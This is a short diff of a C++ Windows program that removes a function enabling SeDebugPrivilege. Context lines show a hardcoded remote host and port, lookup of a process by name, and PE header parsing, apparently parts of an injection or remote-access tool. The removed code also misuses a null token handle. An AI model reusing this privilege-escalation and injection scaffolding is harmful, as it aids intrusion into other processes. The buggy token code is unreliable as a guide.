@@ -12,31 +12,6 @@
 #define DEFAULT_PORT 16208
 #define DEFAULT_IP "servidor.com"
 
-DWORD ChangePrivileges() {
-    HANDLE currentProcess = GetCurrentProcess();
-    PHANDLE htoken = 0;
-    TOKEN_PRIVILEGES priv;
-
-    if (!OpenProcessToken(currentProcess, TOKEN_ADJUST_PRIVILEGES, htoken)) {
-        return FALSE;
-    }
-
-    if (!LookupPrivilegeValue(0, L"SeDebugPrivilege", &priv.Privileges[0].Luid)) {
-        return FALSE;
-    }
-
-    priv.PrivilegeCount = 1;
-    priv.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;
-
-    if (!AdjustTokenPrivileges(htoken, 0, &priv, sizeof TOKEN_PRIVILEGES, 0, 0)) {
-        std::cout << "\n Erro no previlegio";
-        return FALSE;
-    }
-
-    CloseHandle(htoken);
-    return 0;
-}
-
 DWORD get_process_id(const wchar_t* name)
 {
     
@@ -114,7 +89,6 @@ DWORD WINAPI thread_1(LPVOID p) {
 
 int main(int argc, char *argv[])
 {
-    ChangePrivileges();
 
     PIMAGE_NT_HEADERS pINH;
     PIMAGE_DATA_DIRECTORY pIDD;
